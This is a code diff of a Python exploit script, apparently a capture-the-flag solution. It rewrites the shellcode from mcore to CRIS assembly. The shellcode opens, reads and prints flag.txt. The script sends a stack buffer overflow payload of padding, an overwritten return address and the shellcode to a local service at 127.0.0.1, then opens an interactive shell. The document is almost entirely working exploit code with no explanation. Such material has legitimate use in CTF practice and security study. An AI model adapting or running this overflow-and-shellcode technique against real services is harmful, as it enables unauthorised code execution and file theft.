@@ -3,34 +3,31 @@ asm = '''.section .text
 
 .ascii "%s"
 _start:
-  bsr get_addr
-ret:
-  mov r7, r15
+    move.d pc, r0
+    addq 30, r0
 open:
-  mov r2, r7
-  movi r3, 0
-  movi r4, 0
-  movi	r1, 5
-  trap	1
+    move.d r0, r10
+    clear.d r11
+    clear.d r12
+    moveq 5,r9
+    break 13
 read:
-  mov r3, r7
-  movi r4, 0x7f
-  movi	r1, 3
-  trap	1
+    move.d r0, r11
+    moveq 31,r12
+    moveq 3,r9
+    break 13
 write:
-  movi r2, 1
-  mov r3, r7
-  movi r4, 0x7f
-  movi	r1, 4
-  trap	1
-get_addr:
-  bsr ret
+    moveq 0x1, r10
+    move.d r0, r11
+    moveq 31, r12
+    moveq 4,r9
+    break 13
 .ascii "%s"
   '''
 import os
 from lib.mylib import *
 
-ARCH = 'mcore'
+ARCH = 'cris'
 AS = ARCH + '-elf-as'
 OBJDUMP = ARCH + '-elf-objdump'
 FLAG = 'flag.txt'
@@ -48,15 +45,10 @@ shellcode = shellcode + FLAG + '\x00'
 xxd(shellcode)
 
 IP = '127.0.0.1'
-PORT = 10008
+PORT = 10005
 s = mysock(IP, PORT)
-s.send('\n000')
-pad = 'AAAAAAAAAAAAAAAA'
-SP = 0x7ffec0 + len(pad) + 4
-shellcode = pad + p(SP) + shellcode + '\n'
+sl(s, '\n000')
+SP = 0x1ada + 16 + 4
+shellcode = 'A' * 16 + p(SP) + shellcode + '\n'
 sl(s, shellcode)
 shell(s)
-
-'''
-cat /tmp/senddata|mcore-elf-run -t -v bin/easy/mcore-elf.x
-'''
